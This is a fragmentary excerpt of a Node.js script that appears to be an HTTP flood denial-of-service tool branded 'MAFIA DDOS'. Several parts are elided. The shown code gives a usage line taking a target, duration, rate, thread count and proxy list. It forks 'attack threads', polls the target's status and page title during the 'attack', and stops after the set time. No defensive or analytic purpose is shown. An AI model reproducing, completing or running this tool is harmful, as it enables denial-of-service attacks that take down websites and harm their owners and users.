...
if (process.argv.length < 7) {
	console.log(`node httpget.js target time rate(32) thread proxy.txt`);
	process.exit();
}
const headers = {};
...
function getStatus() {
	...
	Promise.race([axiosPromise, timeoutPromise])
		...
		console.log(`[\x1b[35mATTACKING\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
	})
		.
	catch ((error) => {
		if (error.message === 'Connection timed out') {
			console.log(`[\x1b[35mMAFIA DDOS\x1b[0m] ${getCurrentTime()} Connection Timed Out`);
		} else if (error.response) {
			const extractedTitle = getTitleFromHTML(error.response.data);
			console.log(`[\x1b[35mMAFIA DDOS\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
		} else {
			console.log(`[\x1b[35mMAFIA DDOS\x1b[0m] ${getCurrentTime()} ${error.message}`);
		}
	});
}
...
`);
	console.log(`\x1b[96mMAFIA DDOS\x1b[0m`);
	for (let i = 1; i <= process.argv[5]; i++) {
		cluster.fork();
		console.log(`[\x1b[35mMAFIA DDOS\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
	}
	console.log(`[\x1b[35mMAFIA DDOS\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
	setInterval(getStatus, 2000);
	setTimeout(() => {
		console.log(`[\x1b[35mMAFIA DDOS\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
		process.exit(1);
	}, process.argv[3] * 1000);
}
